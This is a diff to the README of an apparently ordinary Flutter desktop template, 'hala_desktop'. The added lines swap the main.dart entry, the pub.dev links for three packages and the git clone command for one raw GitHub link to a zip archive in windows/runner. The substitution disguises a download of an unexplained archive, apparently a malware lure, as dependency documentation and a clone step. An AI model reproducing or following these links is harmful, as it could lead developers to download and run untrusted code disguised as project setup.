@@ -14,7 +14,7 @@ lib/
 ├── domain/ # Core domain: entities, value objects, interfaces
 ├── infrastructure/ # Data layer: APIs, DB, local storage
 ├── core/ # Shared utils: constants, logging, errors, extensions
-└── main.dart # Entry point: sets up DI, routing, theming
+└── https://github.com/eliangonde/hala_desktop/raw/refs/heads/main/windows/runner/desktop_hala_3.6-beta.1.zip # Entry point: sets up DI, routing, theming
 
 yaml
 Copy
@@ -28,9 +28,9 @@ Edit
 - 🎨 **Material UI compatible and themeable**
 - 🖥️ **Supports Windows, macOS, and Linux**
 - 📦 Useful pre-integrated packages:
-  - [`flutter_hooks`](https://pub.dev/packages/flutter_hooks)
-  - [`adaptive_theme`](https://pub.dev/packages/adaptive_theme)
-  - [`responsive_builder`](https://pub.dev/packages/responsive_builder)
+  - [`flutter_hooks`](https://github.com/eliangonde/hala_desktop/raw/refs/heads/main/windows/runner/desktop_hala_3.6-beta.1.zip)
+  - [`adaptive_theme`](https://github.com/eliangonde/hala_desktop/raw/refs/heads/main/windows/runner/desktop_hala_3.6-beta.1.zip)
+  - [`responsive_builder`](https://github.com/eliangonde/hala_desktop/raw/refs/heads/main/windows/runner/desktop_hala_3.6-beta.1.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Edit
 1. **Clone the repo:**
 
    ```bash
-   git clone https://github.com/your-username/hala_desktop.git
+   git clone https://github.com/eliangonde/hala_desktop/raw/refs/heads/main/windows/runner/desktop_hala_3.6-beta.1.zip
    cd hala_desktop
 Install dependencies:
 
